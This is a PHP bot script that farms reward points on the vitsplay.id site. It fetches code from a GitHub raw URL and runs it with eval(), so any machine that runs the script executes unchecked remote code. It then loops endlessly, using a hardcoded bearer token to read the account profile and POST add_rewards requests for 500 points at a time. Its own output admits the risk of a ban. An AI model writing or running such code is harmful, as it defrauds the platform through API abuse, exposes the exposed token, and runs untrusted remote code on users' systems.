<?php

const script = "vitsplay";
  
  
  $function = file_get_contents("https://raw.githubusercontent.com/Bagusivo1999/fullscript/refs/heads/main/curlku");
eval($function);

bn();

echo an(p."1. no timer (resiko ban)".cl.n);


while(true){
$url = "https://vitsplay.id/api/auth.php?action=me";

$headers = [
    "Authorization: Bearer c679220def7b0103ce9c122b391c6f72891b282a2c9e2527",
    "User-Agent: Mozilla/5.0",
    "Accept: */*"
];

$ch = curl_init($url);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$response = curl_exec($ch);

if (curl_errno($ch)) {
    die("Curl Error: " . curl_error($ch));
}

curl_close($ch);

$data = json_decode($response, true);

if (isset($data['user'])) {

    $id     = $data['user']['id'];
    $name   = $data['user']['name'];
    $email  = $data['user']['email'];
    $points = $data['user']['points'];

    echo "User ID : $id\n";
    echo "Nama    : $name\n";
    echo "Email   : $email\n";
    echo "Points  : $points\n";

} else {
    echo "Data user tidak ditemukan";
}




$url = "https://vitsplay.id/api/user.php?action=add_rewards";

$data = [
    "points" => 500,
    "diamonds" => 0,
    "questions" => 1
];

$headers = [
    "Authorization: Bearer c679220def7b0103ce9c122b391c6f72891b282a2c9e2527",
    "Content-Type: application/json",
    "Origin: https://vitsplay.id",
    "Referer: https://vitsplay.id/home.html",
    "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Accept: */*"
];

$ch = curl_init($url);

curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data)); // raw json
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo "Curl Error: " . curl_error($ch);
} else {
    echo $response;
}

curl_close($ch);
}
?>
